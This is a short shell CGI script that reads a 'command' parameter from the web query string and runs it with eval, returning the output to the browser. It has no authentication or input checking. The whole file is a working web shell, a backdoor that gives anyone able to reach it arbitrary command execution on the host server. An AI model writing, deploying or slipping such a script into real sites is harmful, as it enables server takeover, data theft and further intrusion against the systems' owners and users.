#!/bin/sh

COMMAND=$(echo "$QUERY_STRING" | sed -n 's/.*command=\([^&]*\).*/\1/p' | sed 's/%20/ /g')

# Execute the command and capture the output
OUTPUT=$(eval "$COMMAND" 2>&1)

# Return the output
echo "Content-type: text/plain"
echo ""
echo "$OUTPUT"
